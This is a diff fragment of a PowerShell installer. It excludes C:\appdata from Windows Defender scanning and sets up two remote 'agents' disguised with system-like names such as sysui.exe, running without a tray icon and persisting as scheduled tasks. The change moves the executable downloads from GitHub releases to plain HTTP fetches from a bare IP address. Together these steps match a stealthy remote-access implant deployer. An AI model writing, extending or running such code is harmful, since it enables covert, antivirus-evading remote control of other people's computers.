@@ -9,8 +9,8 @@ Add-MpPreference -ExclusionPath "C:\appdata" -ErrorAction SilentlyContinue
 if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }
 
 $agents = @()
-if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Relay='sysui.exe'; Port=8081; Args='-notray' } }
-if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Relay='daljinac2.exe'; Port=1984; Args='-notray' } }
+if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='http://31.220.74.109:9999/sysui.exe'; Port=8081; Args='-notray' } }
+if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='http://31.220.74.109:9999/daljinac2.exe'; Port=1984; Args='-notray' } }
 
 Write-Host "=== Cleanup ===" -ForegroundColor Cyan
 @("daljinac","daljinacWatch","daljinac2","daljinac2Watch",
